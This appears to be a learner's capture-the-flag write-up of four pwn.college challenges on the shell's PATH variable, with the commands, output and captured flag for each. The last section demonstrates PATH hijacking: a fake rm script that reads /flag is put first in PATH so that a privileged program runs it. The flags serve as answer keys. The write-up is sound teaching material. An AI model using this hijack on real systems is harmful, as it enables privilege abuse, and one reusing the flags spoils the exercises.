# Pondering Path

## The Path Variable

I set _PATH=""_ implying the shell to only search in the current directory for executable programs. And later ran _/challenge/run_ to get the flag.


    hacker@path-the-path-variable:~$ PATH=""
    hacker@path-the-path-variable:~$ /challenge/run
    Trying to remove /flag...
    /challenge/run: line 4: rm: No such file or directory
    The flag is still there! I might as well give it to you!
    pwn.college{QDzz0-Ef0HMBgoEAtNBAEYh_cot.dZzNwUDL1cTN0czW}

## Setting PATH

I had set the path to /challenge/more_commands directory PATH="/challenge/more_commands/". And later ran /challenge/run to get the flag.

        hacker@path-setting-path:~$ PATH="/challenge/more_commands/"
        hacker@path-setting-path:~$ /challenge/run
        Invoking 'win'....
        Congratulations! You properly set the flag and 'win' has launched!
        pwn.college{Q_DITrx0naNT9sFOZBb8mtC92yc.dVzNyUDL1cTN0czW}

##Adding Commands

I passed /bin/cat /flag to the shell script named win and set PATH variable using export command. I also learnt the absolute path of the cat command.

        hacker@path-adding-commands:~$ nano win
        hacker@path-adding-commands:~$ chmod +x /home/hacker/win
        hacker@path-adding-commands:~$ export PATH=/home/hacker:$PATH
        hacker@path-adding-commands:~$ /challenge/run
        Invoking 'win'....
        pwn.college{oTTwViDVNRimelhE8hJN7EeqXNv.dZzNyUDL1cTN0czW}

## Hijacking Commands

I passed /bin/cat /flag to the shell script named rm to override the existing rm command and set PATH variable using export command. I ran /challenge/run to get the flag.

        hacker@path-hijacking-commands:~$ nano rm
        hacker@path-hijacking-commands:~$ chmod +x rm
        hacker@path-hijacking-commands:~$ export PATH=/home/hacker:$PATH
        hacker@path-hijacking-commands:~$ /challenge/run
        Trying to remove /flag...
        Found 'rm' command at /home/hacker/rm. Executing!
        pwn.college{4OTTYvM-A2YpCEUhyVE_9hl3S4x.ddzNyUDL1cTN0czW}

        
